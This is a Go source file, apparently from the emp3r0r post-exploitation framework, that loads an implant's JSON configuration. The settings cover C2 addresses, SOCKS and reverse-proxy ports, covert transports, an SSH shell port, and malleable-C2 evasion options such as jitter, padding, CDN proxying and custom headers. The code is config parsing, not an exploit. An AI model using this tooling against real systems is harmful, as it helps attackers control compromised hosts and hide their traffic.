package config

import (
	"encoding/json"
	"fmt"
	"strconv"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
)

// readJSONConfig read runtime variables from JSON, and apply them
func readJSONConfig(jsonData []byte, config_to_write *def.Config) (err error) {
	// parse the json
	var raw map[string]interface{}
	err = json.Unmarshal(jsonData, &raw)
	if err != nil {
		return fmt.Errorf("failed to parse JSON config: %v", err)
	}

	// Helper to safely extract string
	getString := func(key string) string {
		if val, ok := raw[key].(string); ok {
			return val
		}
		return ""
	}

	// Helper to safely extract int
	getInt := func(key string) int {
		if val, ok := raw[key].(float64); ok {
			return int(val)
		}
		return 0
	}

	// Helper to safely extract bool
	getBool := func(key string) bool {
		if val, ok := raw[key].(bool); ok {
			return val
		}
		return false
	}

	config_to_write.CCAddress = getString("cc_address")
	config_to_write.CCHost = getString("cc_host")
	config_to_write.CCPort = getString("cc_port")
	config_to_write.AgentSocksServerPort = getString("agent_socks_server_port")
	config_to_write.AgentSocksTimeout = getInt("agent_socks_timeout")
	config_to_write.StagerHTTPListenerPort = getString("stager_http_listener_port")
	config_to_write.Password = getString("password")
	config_to_write.ShadowsocksLocalSocksPort = getString("shadowsocks_local_socks_port")
	config_to_write.ShadowsocksServerPort = getString("shadowsocks_server_port")
	config_to_write.KCPServerPort = getString("kcp_server_port")
	config_to_write.KCPClientPort = getString("kcp_client_port")
	config_to_write.UseKCP = getBool("use_kcp")
	config_to_write.EnableNCSI = getBool("enable_ncsi")

	if val, ok := raw["ssh_host_key"].(string); ok {
		config_to_write.SSHHostKey = []byte(val)
	}

	config_to_write.Bring2CCReverseProxyPort = getString("bring2cc_reverse_proxy_port")
	config_to_write.SSHDShellPort = getString("sshd_shell_port")
	config_to_write.ProxyChainBroadcastPort = getString("proxy_chain_broadcast_port")
	config_to_write.ProxyChainBroadcastIntervalMin = getInt("proxy_chain_broadcast_interval_min")
	config_to_write.ProxyChainBroadcastIntervalMax = getInt("proxy_chain_broadcast_interval_max")
	config_to_write.PreflightEnabled = getBool("preflight_enabled")
	config_to_write.PreflightURL = getString("preflight_url")
	config_to_write.PreflightMethod = getString("preflight_method")
	if val, ok := raw["preflight_headers"].(map[string]interface{}); ok {
		config_to_write.PreflightHeaders = make(map[string]string)
		for k, v := range val {
			if strV, ok := v.(string); ok {
				config_to_write.PreflightHeaders[k] = strV
			}
		}
	}
	config_to_write.CAPEM = getString("ca_pem")
	config_to_write.CAFingerprint = getString("ca_fingerprint")
	config_to_write.C2TransportProxy = getString("c2_transport_proxy")
	config_to_write.CDNProxy = getString("cdn_proxy")
	config_to_write.DoHServer = getString("doh_server")
	if val := getString("agent_uuid"); val != "" {
		config_to_write.AgentUUID = val
	} else {
		config_to_write.AgentUUID = uuid.NewString()
	}
	config_to_write.AgentUUIDSig = getString("agent_uuid_sig")
	config_to_write.AgentTag = getString("agent_tag")
	config_to_write.CCTimeout = getInt("cc_timeout")

	// Malleable C2
	config_to_write.C2Prefix = getString("c2_prefix")
	config_to_write.CheckInPath = getString("checkin_path")
	config_to_write.MsgPath = getString("msg_path")
	config_to_write.FTPPath = getString("ftp_path")
	config_to_write.WWWPath = getString("www_path")
	config_to_write.ProxyPath = getString("proxy_path")
	config_to_write.UserAgent = getString("user_agent")
	config_to_write.PaddingMin = getInt("padding_min")
	config_to_write.PaddingMax = getInt("padding_max")
	config_to_write.Jitter = getInt("jitter")
	config_to_write.ModulePath = getString("module_path")
	config_to_write.IsRunByStager = getBool("is_run_by_stager")

	// C2 Headers
	if val, ok := raw["c2_headers"].(map[string]interface{}); ok {
		config_to_write.C2Headers = make(map[string]string)
		for k, v := range val {
			if strV, ok := v.(string); ok {
				config_to_write.C2Headers[k] = strV
			}
		}
	}

	calculateReverseProxyPort := func() (string, error) {
		p, err := strconv.Atoi(config_to_write.AgentSocksServerPort)
		if err != nil {
			return "", fmt.Errorf("WTF? AgentSocksServerPort: %s: %v. Invalid JSON config, perhaps start over with a new config file?", config_to_write.AgentSocksServerPort, err)
		}

		// reverseProxyPort
		rProxyPortInt := p + 1
		return strconv.Itoa(rProxyPortInt), nil
	}
	config_to_write.Bring2CCReverseProxyPort, err = calculateReverseProxyPort()
	if err != nil {
		return err
	}

	// these variables are decided by other variables
	def.CCAddress = fmt.Sprintf("https://%s", config_to_write.CCAddress)
	def.DefaultShell = "/bin/bash" // Default to standard bash

	return
}
